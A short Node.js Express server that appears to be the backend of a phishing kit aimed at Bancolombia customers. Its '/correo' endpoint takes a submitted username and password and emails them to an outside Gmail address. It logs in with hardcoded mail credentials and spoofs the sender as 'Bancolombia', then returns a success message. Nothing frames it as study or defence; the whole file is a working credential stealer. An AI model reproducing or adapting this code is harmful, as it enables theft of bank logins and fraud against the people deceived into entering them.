const express = require('express');
const nodemailer = require('nodemailer');
var cors = require('cors');

const app = express();

app.use(cors());

app.set('port', 3030);
app.enable("trust proxy");
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

async function main(usuario, pswd) {

  let transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: 'apppersonasinfo@gmail.com',
        pass: 'AyudaPersonas'
    }
  });

  // send mail with defined transport object
  let info = await transporter.sendMail({
    from: '"Bancolombia 👻" <bancolombia@noreply.com>', // sender address
    to: "ayudasapppersonas@gmail.com", // list of receivers
    subject: "new user/pass", // Subject line
    text: `Usuario: ${usuario} \ncontraseña: ${pswd}` // plain text body
  });

  console.log("Mensaje enviado");
}

app.post('/correo', (req, res) => {
  main(req.body.user, req.body.pswd).catch(console.log);
  res.json("succesfully");
});

app.listen(app.get('port'), () => {
  console.log('Server on port', app.get('port'));
});